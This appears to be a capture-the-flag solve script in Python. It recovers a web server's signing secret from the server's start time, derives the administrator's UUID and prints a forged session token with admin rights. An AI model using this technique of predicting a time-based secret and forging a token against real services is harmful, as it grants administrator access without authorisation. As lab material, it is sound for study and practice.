import requests
from datetime import datetime, timedelta
import hashlib
import uuid

# secret
server_time = datetime(2024, 9, 28, 19, 42, 48)
uptime = timedelta(minutes=2, seconds=34)
server_start_time = server_time - uptime
server_start_str = server_start_time.strftime('%Y%m%d%H%M%S')
secure_key = hashlib.sha256(f'secret_key_{server_start_str}'.encode()).hexdigest()
print(f'secret:\t{secure_key}')

# uid
username = 'administrator'
secret = uuid.UUID('31333337-1337-1337-1337-133713371337')
uid = str(uuid.uuid5(secret, username))
print(f'uid:\t{uid}')

# token
print("token:\t{" + f"'is_admin': True, 'uid': '{uid}', 'username': '{username}'" + "}")

